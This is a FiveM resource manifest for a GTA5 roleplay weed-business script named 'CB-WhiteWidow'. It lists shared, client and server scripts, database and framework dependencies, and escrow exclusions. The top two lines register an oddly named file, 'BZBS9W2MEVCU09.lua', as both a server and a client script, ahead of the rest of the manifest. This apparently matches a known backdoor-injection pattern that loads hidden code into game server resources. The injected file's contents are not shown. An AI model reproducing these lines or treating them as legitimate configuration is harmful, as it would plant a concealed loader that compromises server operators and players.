server_script "BZBS9W2MEVCU09.lua"
client_script "BZBS9W2MEVCU09.lua"
fx_version 'cerulean'
game 'gta5'

name "CB-WhiteWidow"
description "Weed Business script for FiveM"
author "Cool Brad Scripts"
version "1.0.3"

lua54 'yes'
use_experimental_fxv2_oal 'yes'

shared_scripts {
	'@ox_lib/init.lua',
	'config.lua'
}

client_scripts {
	'@qbx_core/modules/playerdata.lua', -- For QBOX users
	'client/framework.lua',
	'client/*.lua'
}

server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'server/framework.lua',
	'server/*.lua'
}

escrow_ignore {
	'config.lua',
	'client/framework.lua',
	'server/framework.lua'
}
dependency '/assetpacks'